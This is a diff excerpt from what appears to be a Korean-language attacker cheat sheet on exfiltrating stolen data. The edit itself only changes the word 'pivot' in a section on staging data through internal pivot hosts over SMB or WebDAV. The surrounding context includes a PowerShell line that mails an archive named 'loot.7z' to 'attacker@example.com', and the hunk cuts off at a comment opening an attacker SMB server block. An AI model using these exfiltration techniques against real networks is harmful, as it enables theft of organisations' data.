@@ -142,7 +142,7 @@ $msg.To = "attacker@example.com"; $msg.Attachments.Add('C:\loot.7z'); $msg.Send(
 
 ## SMB / WebDAV (내부 망)
 
-**내부 피봇 호스트** 까지만 보낸 뒤 그곳에서 다시 외부로 빼낼 때 유용.
+**내부 Pivot 호스트** 까지만 보낸 뒤 그곳에서 다시 외부로 빼낼 때 유용.
 
 ```bash
 # 공격자 임시 SMB 서버
